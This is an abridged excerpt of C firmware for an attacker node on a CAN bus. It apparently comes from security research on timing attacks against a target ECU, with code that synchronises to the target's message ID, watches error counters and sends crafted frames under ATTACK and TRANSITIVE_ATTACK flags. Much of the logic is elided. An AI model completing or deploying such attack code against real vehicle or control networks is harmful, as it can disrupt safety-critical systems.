...
volatile uint8_t g_sync_since_idle = 0;
...
/* Need to enable this instead of rxpm since the attacker transmits the PM */
#define DISABLE_ABORT_TX_PRECEDED
...
#define LATENCY_0B ((44*120000)/(BITRATE/1000)) /* approximately 1 0-byte message transmission time */

#if defined(SYNC_0PHASE)
#define DIFFERENCE ((90*120000)/(BITRATE/1000))
#else
#define DIFFERENCE ((80*120000)/(BITRATE/1000))
#endif

//#define DIFFERENCE ((108*120000)/(BITRATE/1000)) //

#define LATENCY ((96*120000)/(BITRATE/1000))
...
uint8_t g_ui8TXMsgData_5[1] = { 0x99 };
uint8_t g_ui8TXMsgData_10[6] = { 0xAF, 0xBE, 0xCD, 0xDC, 0xEB, 0xFA };
...
#if defined(TRANSITIVE_ATTACK)
uint8_t g_ui8TXMsgData_5A2[3] = { 0xEE, 0xEE, 0xEE  };
#endif

uint8_t g_ui8TXMsgData_1000[1] = { 0x18 };
...
#if defined(ATTACK)
//uint32_t timer_val = TimerLoadGet(TIMER1_BASE, TIMER_A);
//if (timer_val != 0) {
    if ( count % ATTACK_LATENCY == 0 ) {
...
InitCAN0(void)
{
    ...
    g_sCAN0TxMessage_5.ui32MsgID = 0xA0;
    ...
    g_sCAN0TxMessage_10.ui32MsgID = 0xB0;
    ...
    g_sCAN0TxMessage_1000.ui32MsgID = 0xD0;
    ...
    while(1)
    {
        ...
        if (g_bTXFlag_5) {
            ...
            if ( g_target_id == TARGET_ID ) {
                CANErrCntrGet(CAN0_BASE, &rec, &tec);
                ++g_ui32TXCount;
                if (g_ui32TXCount < 10 || tec > 0) {
#if defined(DISABLE_ABORT_TX_PRECEDED)
            ...
            if (g_sCAN0RxMessage.ui32MsgID == g_target_id) {
                ...
                if (g_sync != 1) {
                    ...
                    //else if ( g_msg_since_idle < g_sync_since_idle ) {
                        else if ( g_msg_since_idle == 0 ) {
                            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL-DIFFERENCE); /* re-synch */
                            //g_sync_since_idle = 1;
                            count = 0;
                            g_sync = 2;
                    }
